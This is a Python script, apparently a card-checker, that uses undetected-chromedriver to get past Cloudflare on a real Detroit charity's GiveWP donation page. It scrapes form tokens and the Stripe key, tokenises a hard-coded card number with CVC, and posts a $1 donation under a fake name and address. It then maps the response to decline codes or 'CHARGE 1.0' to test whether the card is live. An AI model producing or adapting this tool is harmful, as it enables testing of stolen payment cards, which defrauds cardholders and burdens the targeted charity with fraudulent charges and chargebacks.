import time
import re
import json
import random
import os
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ═══════════════════════════════════════════════════════════
# ATTEMPT 1: undetected-chromedriver
# ═══════════════════════════════════════════════════════════

def try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc):
    """المحاولة الأولى: undetected-chromedriver"""
    print("\n" + "="*60)
    print("🎯 ATTEMPT 1: undetected-chromedriver")
    print("="*60)
    
    try:
        import undetected_chromedriver as uc
    except ImportError:
        print("❌ undetected-chromedriver not installed")
        return None
    
    driver = None
    try:
        # ═══ Options ═══
        options = uc.ChromeOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        
        # Headless
        # options.add_argument('--headless=new')  # ← سيبها مشغلة الأول للتشخيص
        
        # User-Agent حقيقي
        options.add_argument(
            'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
        )
        
        # ═══ Launch ═══
        print("🚀 Launching undetected Chrome...")
        driver = uc.Chrome(options=options, version_main=None, use_subprocess=True)
        
        # ═══ Open Page ═══
        print(f"🌐 Opening: {url}")
        driver.get(url)
        time.sleep(10)  # استنى Cloudflare
        
        # ═══ Check ═══
        current_url = driver.current_url
        title = driver.title
        html = driver.page_source
        
        print(f"📍 URL: {current_url}")
        print(f"📍 Title: {title}")
        print(f"📄 Source length: {len(html)}")
        
        # Cloudflare check
        html_lower = html.lower()
        if 'just a moment' in html_lower or 'checking your browser' in html_lower:
            print("⚠️ Cloudflare Challenge still active")
            time.sleep(15)  # استنى أطول
            html = driver.page_source
            if 'just a moment' in html.lower():
                print("❌ Cloudflare Challenge - FAILED")
                return {'status': 'CLOUDFLARE_CHALLENGE'}
        
        if 'access denied' in html_lower or '403 forbidden' in html_lower:
            print("❌ 403 Forbidden")
            return {'status': 'ACCESS_DENIED_403'}
        
        # ═══ Extract Form Data ═══
        from selenium.webdriver.common.by import By
        
        form_id = None
        form_hash = None
        form_prefix = None
        stripe_key = None
        
        try:
            form_id_els = driver.find_elements(By.NAME, "give-form-id")
            if form_id_els:
                form_id = form_id_els[0].get_attribute("value")
        except: pass
        
        try:
            form_hash_els = driver.find_elements(By.NAME, "give-form-hash")
            if form_hash_els:
                form_hash = form_hash_els[0].get_attribute("value")
        except: pass
        
        try:
            form_prefix_els = driver.find_elements(By.NAME, "give-form-id-prefix")
            if form_prefix_els:
                form_prefix = form_prefix_els[0].get_attribute("value")
        except: pass
        
        stripe_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
        if stripe_match:
            stripe_key = stripe_match.group(0)
        
        print(f"✅ Form ID: {form_id}")
        print(f"✅ Form Hash: {form_hash}")
        print(f"✅ Form Prefix: {form_prefix}")
        print(f"✅ Stripe Key: {stripe_key}")
        
        if not form_id or not form_hash:
            print("❌ Missing form data")
            return {'status': 'MISSING_FORM_DATA', 'html_len': len(html)}
        
        # ═══ Generate Stripe PM via JS ═══
        print("💳 Generating Stripe Payment Method...")
        
        js_script = """
        var callback = arguments[arguments.length - 1];
        var stripeKey = arguments[0];
        var cardNum = arguments[1];
        var expM = arguments[2];
        var expY = arguments[3];
        var cvc = arguments[4];
        
        (async () => {
            try {
                // Load Stripe.js
                if (typeof Stripe === 'undefined') {
                    await new Promise((resolve, reject) => {
                        const s = document.createElement('script');
                        s.src = 'https://js.stripe.com/v3/';
                        s.onload = resolve;
                        s.onerror = () => reject(new Error('Failed to load Stripe.js'));
                        document.head.appendChild(s);
                    });
                    await new Promise(r => setTimeout(r, 2000));
                }
                
                if (typeof Stripe === 'undefined') {
                    callback(JSON.stringify({error: 'Stripe.js not loaded'}));
                    return;
                }
                
                const stripe = Stripe(stripeKey);
                
                const result = await stripe.createPaymentMethod({
                    type: 'card',
                    card: {
                        number: cardNum,
                        exp_month: parseInt(expM),
                        exp_year: parseInt(expY),
                        cvc: cvc
                    },
                    billing_details: {
                        name: 'James Smith',
                        email: 'james.smith@gmail.com',
                        address: {
                            line1: '123 Main Street',
                            city: 'New York',
                            state: 'NY',
                            postal_code: '10001',
                            country: 'US'
                        }
                    }
                });
                
                if (result.error) {
                    callback(JSON.stringify({
                        error: result.error.message,
                        code: result.error.code,
                        decline_code: result.error.decline_code
                    }));
                } else {
                    callback(JSON.stringify({
                        pm_id: result.paymentMethod.id,
                        success: true
                    }));
                }
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
        })();
        """
        
        try:
            driver.set_script_timeout(30)
            result_raw = driver.execute_async_script(
                js_script,
                stripe_key,
                card_number,
                exp_month,
                exp_year,
                cvc
            )
            
            print(f"📥 Stripe response: {result_raw[:300]}")
            
            pm_data = json.loads(result_raw)
            
            if 'error' in pm_data:
                error = pm_data['error']
                decline = pm_data.get('decline_code', '')
                code = pm_data.get('code', '')
                
                if decline:
                    return {'status': f'STRIPE_{decline.upper()}', 'error': error}
                if code:
                    return {'status': f'STRIPE_{code.upper()}', 'error': error}
                return {'status': f'STRIPE_ERROR', 'error': error}
            
            pm_id = pm_data.get('pm_id')
            print(f"✅ PM ID: {pm_id}")
            
            # ═══ Get Cookies ═══
            cookies = driver.get_cookies()
            cookie_dict = {c['name']: c['value'] for c in cookies}
            print(f"✅ Got {len(cookies)} cookies")
            
            # ═══ POST Donation ═══
            print("💸 Submitting donation...")
            
            session = requests.Session()
            session.verify = False
            
            for c in cookies:
                session.cookies.set(c['name'], c['value'], domain=c.get('domain', '.higherhopesdetroit.org'))
            
            donation_url = f'https://higherhopesdetroit.org/donation/?payment-mode=stripe&form-id={form_id}'
            
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': form_prefix or f'{form_id}-1',
                'give-form-id': form_id,
                'give-form-title': 'Give a Donation',
                'give-current-url': 'https://higherhopesdetroit.org/donation/',
                'give-form-url': 'https://higherhopesdetroit.org/donation/',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': form_hash,
                'give-price-id': 'custom',
                'give-amount': '1.00',
                'give_tributes_type': 'In Honor Of',
                'give_tributes_show_dedication': 'no',
                'give_tributes_radio_type': 'In Honor Of',
                'give_tributes_first_name': '',
                'give_tributes_last_name': '',
                'give_stripe_payment_method': pm_id,
                'payment-mode': 'stripe',
                'give_first': 'James',
                'give_last': 'Smith',
                'give_email': 'james.smith@gmail.com',
                'give_comment': 'Donation',
                'card_name': 'James Smith',
                'billing_country': 'US',
                'card_address': '123 Main Street',
                'card_address_2': '',
                'card_city': 'New York',
                'card_state': 'NY',
                'card_zip': '10001',
                'give_action': 'purchase',
                'give-gateway': 'stripe',
            }
            
            headers = {
                'authority': 'higherhopesdetroit.org',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://higherhopesdetroit.org',
                'referer': 'https://higherhopesdetroit.org/donation/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            }
            
            response = session.post(donation_url, data=data, headers=headers, timeout=30)
            
            print(f"📥 POST response: {response.status_code}, len={len(response.text)}")
            
            return {
                'status': parse_donation_response(response.text, response.status_code),
                'pm_id': pm_id,
                'cookies_count': len(cookies)
            }
        
        except Exception as e:
            print(f"❌ Stripe.js error: {e}")
            return {'status': f'STRIPE_JS_ERROR: {str(e)[:80]}'}
    
    except Exception as e:
        print(f"❌ Error: {e}")
        return {'status': f'ERROR: {str(e)[:100]}'}
    
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


# ═══════════════════════════════════════════════════════════
# Parse Response
# ═══════════════════════════════════════════════════════════

def parse_donation_response(text, status_code):
    """تحليل الرد من GiveWP"""
    text_lower = text.lower()
    
    live_map = {
        'insufficient_funds': 'INSUFFICIENT_FUNDS',
        'insufficient funds': 'INSUFFICIENT_FUNDS',
        'your card has insufficient funds': 'INSUFFICIENT_FUNDS',
        'card was declined': 'DECLINED',
        'your card was declined': 'DECLINED',
        'expired_card': 'EXPIRED_CARD',
        'your card has expired': 'EXPIRED_CARD',
        'suspected fraud': 'SUSPECTED_FRAUD',
        'fraudulent': 'SUSPECTED_FRAUD',
        'incorrect_cvc': 'CVV_FAILURE',
        'security code is incorrect': 'CVV_FAILURE',
        'incorrect_number': 'INVALID_CARD_NUMBER',
        'card number is incorrect': 'INVALID_CARD_NUMBER',
        'do_not_honor': 'DO_NOT_HONOR',
        'transaction_not_allowed': 'TRANSACTION_NOT_ALLOWED',
        'processing_error': 'PROCESSING_ERROR',
        'thank you': 'CHARGE 1.0',
        'success': 'CHARGE 1.0',
    }
    
    for kw, resp in live_map.items():
        if kw in text_lower:
            return resp
    
    # JSON
    if text.strip().startswith('{'):
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                if data.get('success'):
                    return 'CHARGE 1.0'
                if 'data' in data and isinstance(data['data'], dict):
                    inner = data['data']
                    if 'error' in inner:
                        return f"GATEWAY_ERROR: {inner['error'][:100]}"
        except:
            pass
    
    # Search error in HTML
    matches = re.findall(r'"error[^"]*"\s*:\s*"([^"]+)"', text)
    if matches:
        return f"ERROR: {matches[0][:100]}"
    
    match = re.search(r'(error[:\s]+[^<\n]{5,150})', text_lower)
    if match:
        return f"ERROR: {match.group(1)[:100]}"
    
    if status_code == 200:
        return f"UNKNOWN_200: {text[:200].strip()}"
    return f"HTTP_{status_code}"


# ═══════════════════════════════════════════════════════════
# Run
# ═══════════════════════════════════════════════════════════

if __name__ == '__main__':
    url = 'https://higherhopesdetroit.org/donation/'
    card = '5104040287872188|12|2027|951'
    
    parts = card.split('|')
    card_number = parts[0]
    exp_month = parts[1]
    exp_year = parts[2][-2:]  # YY
    cvc = parts[3]
    
    # ═══ Try undetected-chromedriver ═══
    result = try_undetected_chromedriver(url, card_number, exp_month, exp_year, cvc)
    
    print("\n" + "="*60)
    print(f"📊 FINAL RESULT: {result}")
    print("="*60)
